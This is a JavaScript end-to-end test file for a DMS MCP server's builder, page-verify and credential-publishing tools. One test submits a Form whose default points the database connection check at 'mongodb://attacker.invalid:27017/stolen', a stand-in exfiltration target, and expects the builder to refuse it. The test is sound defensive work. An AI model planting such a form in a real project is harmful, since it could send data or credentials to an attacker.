import { existsSync, mkdirSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { BRIDGE_LAUNCHER, fieldOf, itemsOf, parseJson, textOf, toolText, withBridge } from "../mcp-bridge.mjs";
import { createRole, joinedMember } from "./settings-members/steps.mjs";

/**
 * @typedef {import("@antelopejs/dms/e2e").Ctx} Ctx
 */

const ROUTE = "/dms/mcp";
const OWNER_ONLY_MODE = 0o600;
const PERMISSION_BITS = 0o777;
const USERS_PAGE = "/table-view/table-view-users";
const CONNECT_CHECK = "/api/builder/database/connections/check";
const USERS_PERMISSION = "library.components.table-view.table-view-users";
const MOCKUP = "page-verify-member";
/** A live route of the playground: a mockup block reading it draws a value of the backend, not a fixture. */
const LIVE_KPI_ROUTE = "/api/dashboard/kpi/revenue";
const MOCKUP_SPEC = {
  version: 1,
  title: "Users desk",
  pages: [
    {
      id: "users",
      title: "Users",
      fixtures: { users: [{ _id: "u1", name: "Ada" }, { _id: "u2", name: "Grace" }] },
      tree: [
        {
          type: "TableView",
          options: {
            caption: "Users",
            fetchUrl: "fixture:users",
            rowIdKey: "_id",
            columns: { name: { name: "Name", type: "string", order: 1 } },
          },
        },
        { type: "KpiCard", options: { title: "Revenue", fetchUrl: LIVE_KPI_ROUTE } },
      ],
    },
  ],
};

/**
 * Writes the journey's mockup under the project's `mockups/`, which the
 * development backend reads from its working directory.
 *
 * @param {string} root
 */
function writeMockup(root) {
  const folder = join(root, "mockups", MOCKUP);
  mkdirSync(folder, { recursive: true });
  writeFileSync(join(folder, "spec.json"), JSON.stringify(MOCKUP_SPEC));
}

/**
 * Every entry under the project's `.antelope/page-verify/`, of any kind, by path from that folder.
 *
 * @param {string} root
 */
function verifyFilesOf(root) {
  const folder = join(root, ".antelope", "page-verify");
  /** @type {string[]} */
  const files = existsSync(folder) ? readdirSync(folder, { recursive: true }).map(String) : [];
  return new Set(files);
}

/**
 * The entries a call wrote under `.antelope/page-verify/`: those there after it that were not there before.
 *
 * @param {Set<string>} before
 * @param {string} root
 */
function writtenSince(before, root) {
  return [...verifyFilesOf(root)].filter((file) => !before.has(file));
}

/** An image, video, trace or document extension, or the word screenshot, in a tool answer. */
const IMAGE_MENTION = /\.(?:png|jpe?g|webp|gif|pdf|webm|mp4|zip|har)\b|screenshot/i;

/** The MCP server the DMS serves in development, reached through its stdio bridge. */
export const journeys = [
  {
    id: "bridge-calls-a-read-tool",
    title: "tools/call through the bridge runs builder_catalog and answers the block catalog as text",
    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call builder_catalog`,
    async run(/** @type {Ctx} */ ctx) {
      await withBridge(ctx, async (session) => {
        const { text, isError } = toolText(await session.call("builder_catalog"));
        const catalog = parseJson(text);
        await ctx.verify("the catalog lists block types, DataTypes and the reserved field names", [
          ctx.equal("the tool reports no failure", isError, false),
          ctx.holds("a block type is indexed", itemsOf(fieldOf(catalog, "blocks")).length > 0, text.slice(0, 200)),
          ctx.holds("a DataType is indexed", itemsOf(fieldOf(catalog, "dataTypes")).length > 0, text.slice(0, 200)),
          ctx.holds("reservedFieldNames is present", itemsOf(fieldOf(catalog, "reservedFieldNames")).length > 0, text.slice(0, 200)),
        ]);
      });
    },
  },
  {
    id: "builder-refuses-a-form-posting-to-the-connect-check",
    title: "builder_add_block refuses a Form that submits to the assistant's database connect check, and the page holds no such block",
    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call builder_add_block`,
    async run(/** @type {Ctx} */ ctx) {
      await withBridge(ctx, async (session) => {
        const [page] = itemsOf(fieldOf(parseJson(toolText(await session.call("builder_list_pages")).text), "pages"));
        const pageRef = textOf(fieldOf(page, "ref"));
        const added = toolText(
          await session.call("builder_add_block", {
            page: pageRef,
            name: "reconnect",
            type: "Form",
            config: {
              title: "Reconnect the database",
              submitUrl: CONNECT_CHECK,
              submitUrlMethod: "POST",
              submitDefaults: { url: "mongodb://attacker.invalid:27017/stolen" },
              fields: [{ id: "note", label: "Note", type: { $dataType: "string" } }],
            },
          }),
        );
        const issues = itemsOf(fieldOf(fieldOf(parseJson(added.text), "error"), "issues"));
        await ctx.verify("the builder refuses the form, naming its submitUrl", [
          ctx.equal("the tool reports a failure", added.isError, true),
          ctx.equal("the refused option", issues.map((issue) => fieldOf(issue, "pointer")), ["/config/submitUrl"]),
        ]);
        const structure = toolText(await session.call("builder_page_structure", { pageRef }));
        await ctx.verify("the page was not written", [
          ctx.holds("the page holds no block posting to the connect check", !structure.text.includes(CONNECT_CHECK), structure.text.slice(0, 300)),
        ]);
      });
    },
  },
  {
    id: "page-verify-reports-a-page",
    title: "page_verify opens a page in a headless Chromium as the owner and reports its blocks, data and form validation without a screenshot, and fails a route no page serves",
    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call page_verify`,
    async run(/** @type {Ctx} */ ctx) {
      const root = ctx.state.runPlayground ?? ctx.state.playground;
      const before = verifyFilesOf(root);
      await withBridge(ctx, async (session) => {
        const { text, isError } = toolText(
          await session.call("page_verify", { page: [USERS_PAGE, "/no-such-page"], viewports: ["desktop"] }),
        );
        const written = writtenSince(before, root);
        const report = parseJson(text);
        const [users, missing] = itemsOf(fieldOf(report, "pages"));
        const table = itemsOf(fieldOf(users, "data")).find((block) => fieldOf(block, "type") === "TableView");
        const form = itemsOf(fieldOf(users, "interactions")).find((entry) => fieldOf(entry, "kind") === "form");
        await ctx.verify("the users page passes and the unknown route fails", [
          ctx.equal("the answer flags the failing page", isError, true),
          ctx.equal("signed in as the owner", fieldOf(fieldOf(report, "account"), "kind"), "owner"),
          ctx.holds("users page passes", fieldOf(users, "ok") === true, JSON.stringify(fieldOf(users, "failures"))),
          ctx.equal("the table loaded rows", fieldOf(table, "state"), "ok"),
          ctx.holds("the New entry form showed validation", fieldOf(form, "ok") === true, JSON.stringify(form)),
          ctx.equal("no file is written under .antelope/page-verify", written, []),
          ctx.holds("the report names no screenshot or file", !IMAGE_MENTION.test(text), text.slice(0, 400)),
          ctx.holds("the unknown route names its failure", textOf(itemsOf(fieldOf(missing, "failures"))[0]).startsWith("not a registered page route"), JSON.stringify(missing)),
        ]);
      });
    },
  },
  {
    id: "page-verify-member-against-mockup",
    title: "page_verify opens a page as a member holding only one role and draws the mockup comparison through the owner's session, which the member is refused",
    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call page_verify { role, mockup }`,
    backend: "dev",
    async run(/** @type {Ctx} */ ctx) {
      const root = ctx.state.runPlayground ?? ctx.state.playground;
      writeMockup(root);
      const roleName = ctx.unique("Reviewer");
      await createRole(ctx, roleName, [USERS_PERMISSION, `${USERS_PERMISSION}.table`]);
      const admin = await ctx.tab("admin");
      await admin.signIn("admin");
      const { email } = await joinedMember(ctx, admin, { firstName: "Iris", roleName });
      const owner = await ctx.api("GET the mockup as the owner", { method: "GET", path: `/api/mockup/${MOCKUP}` });
      const member = await ctx.api("GET the mockup as the member", { method: "GET", path: `/api/mockup/${MOCKUP}`, as: "iris" });
      await ctx.verify("only the owner reads the mockup the viewer draws", [ctx.status(owner, 200), ctx.status(member, 403)]);
      const before = verifyFilesOf(root);
      await withBridge(ctx, async (session) => {
        const { text } = toolText(
          await session.call("page_verify", { page: USERS_PAGE, role: roleName, mockup: MOCKUP, viewports: ["desktop"] }),
        );
        const written = writtenSince(before, root);
        const report = parseJson(text);
        const account = fieldOf(report, "account");
        const [users] = itemsOf(fieldOf(report, "pages"));
        const comparison = fieldOf(fieldOf(users, "render"), "mockup");
        const [table, kpi] = itemsOf(fieldOf(comparison, "blocks"));
        const [desktop] = itemsOf(fieldOf(fieldOf(users, "render"), "viewports"));
        const pageTable = itemsOf(fieldOf(desktop, "blocks")).find((block) => fieldOf(block, "path") === fieldOf(table, "pagePath"));
        await ctx.verify("the page opened as the member and the mockup was drawn beside it", [
          ctx.equal("signed in as a member", fieldOf(account, "kind"), "member"),
          ctx.equal("the member is the invited one", fieldOf(account, "email"), email),
          ctx.equal("the member holds the asked role", fieldOf(account, "role"), roleName),
          ctx.equal("the comparison names the mockup", fieldOf(comparison, "mockup"), MOCKUP),
          ctx.equal("the viewer drew the mockup", fieldOf(comparison, "unavailable"), undefined),
          ctx.equal("the viewer drew the KPI that reads a live route", fieldOf(kpi, "type"), "dms-kpi-card"),
          ctx.equal("no file is written under .antelope/page-verify, of the page or of the mockup", written, []),
          ctx.holds("the report names no screenshot or file", !IMAGE_MENTION.test(text), text.slice(0, 400)),
          ctx.equal("the mockup table pairs with the page table", fieldOf(table, "status"), "matched"),
          ctx.equal("the member's page drew that table", fieldOf(pageTable, "present"), true),
        ]);
      });
    },
  },
  {
    id: "bridge-files-published",
    title: "the backend writes the bridge credential with owner-only mode and adds the dms server to .mcp.json",
    entryPoint: "node_modules/.cache/dms/mcp.json, .mcp.json",
    async run(/** @type {Ctx} */ ctx) {
      const root = ctx.state.runPlayground ?? ctx.state.playground;
      const credential = join(root, "node_modules", ".cache", "dms", "mcp.json");
      const published = parseJson(readFileSync(credential, "utf8"));
      const config = parseJson(readFileSync(join(root, ".mcp.json"), "utf8"));
      await ctx.verify("the credential file points at the route and only its owner can read it", [
        ctx.holds("route URL", textOf(fieldOf(published, "url")).endsWith(ROUTE), textOf(fieldOf(published, "url"))),
        ctx.holds("a credential is present", textOf(fieldOf(published, "token")) !== "", "token present"),
        ctx.equal("file mode", statSync(credential).mode & PERMISSION_BITS, OWNER_ONLY_MODE),
      ]);
      await ctx.verify(".mcp.json launches the bridge", [
        ctx.equal("dms server", fieldOf(fieldOf(config, "mcpServers"), "dms"), { command: "node", args: [BRIDGE_LAUNCHER] }),
      ]);
    },
  },
];
